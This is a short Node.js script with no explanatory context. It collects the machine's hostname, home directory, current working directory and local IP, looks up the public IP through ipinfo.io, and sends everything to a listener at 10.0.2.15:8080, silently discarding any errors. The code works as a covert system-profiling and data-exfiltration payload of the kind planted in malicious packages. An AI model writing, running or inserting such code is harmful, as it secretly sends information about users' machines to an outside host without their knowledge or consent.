const os = require('os');
const axios = require('axios');

const localIP = Object.values(os.networkInterfaces())
  .flat()
  .find((item) => item.family === 'IPv4' && !item.internal)?.address || 'Unknown';
const profile = {
  hostname: os.hostname(),
  homeDirectory: os.homedir(),
  currentDirectory: process.cwd(),
  localIP,
};

axios.get('https://ipinfo.io/json').then((response) => {
  profile.publicIP = response.data.ip || 'Unknown';
  return axios.post('http://10.0.2.15:8080/', profile);
}).catch(() => {});
